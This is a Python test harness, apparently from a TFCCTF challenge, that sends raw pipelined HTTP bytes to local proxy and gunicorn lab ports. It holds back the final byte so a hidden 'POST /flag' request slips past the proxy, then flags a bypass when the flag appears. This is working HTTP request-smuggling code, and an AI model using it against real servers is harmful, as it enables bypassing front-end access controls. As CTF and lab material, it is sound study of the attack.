#!/usr/bin/env python3
"""Framing-differential matrix against the local labs, with a POST /flag plus brevski: george tail.

TFCCTF{ through the proxy means proxoxy passed the tail as body and gunicorn parsed it as a request."""
# Gthread parses buffered pipelined bytes only once the socket is readable again, so the last byte is held back.
import socket
import sys
import time

PROXY, DIRECT = 38888, 38900
REALPROXY, REALDIRECT = 28888, 28900
H = "127.0.0.1"

TAIL = b"POST /flag HTTP/1.1\r\nHost: x\r\nbrevski: george\r\nContent-Length: 0\r\n\r\n"


def deliver(host, port, blob, hold=1, wait=0.7, read=2.5):
    """Send blob minus the last `hold` bytes, drain, send the rest, drain."""
    s = socket.create_connection((host, port), timeout=8)
    out = b""
    try:
        s.sendall(blob[:-hold] if hold else blob)
        time.sleep(wait)
        s.settimeout(read)
        try:
            while True:
                d = s.recv(65536)
                if not d:
                    return out
                out += d
        except socket.timeout:
            pass
        if hold:
            s.sendall(blob[-hold:])
            time.sleep(wait)
            s.settimeout(read)
            try:
                while True:
                    d = s.recv(65536)
                    if not d:
                        break
                    out += d
            except socket.timeout:
                pass
    except Exception as e:
        out += b"<ERR %r>" % (e,)
    finally:
        s.close()
    return out


def run(name, payload, proxy=PROXY, direct=DIRECT, hold=1):
    rp = deliver(H, proxy, payload, hold=hold)
    rd = deliver(H, direct, payload, hold=hold)
    fp = b"TFCCTF{" in rp
    fd = b"TFCCTF{" in rd
    sp = rp.split(b"\r\n", 1)[0].decode(errors="replace") if rp else "<DROPPED>"
    mark = "   *** BYPASS ***" if fp else ""
    print(f"{name:46s} proxy={sp:26s} nresp={rp.count(b'HTTP/1.1 ')} "
          f"gunicorn_smuggles={'Y' if fd else 'n'}{mark}")
    return rp, rd


def req(headers, body=b"", method=b"POST", path=b"/echo", ver=b"HTTP/1.1", host=b"x"):
    h = b"".join(k + b": " + v + b"\r\n" for k, v in headers)
    return method + b" " + path + b" " + ver + b"\r\nHost: " + host + b"\r\n" + h + b"\r\n" + body
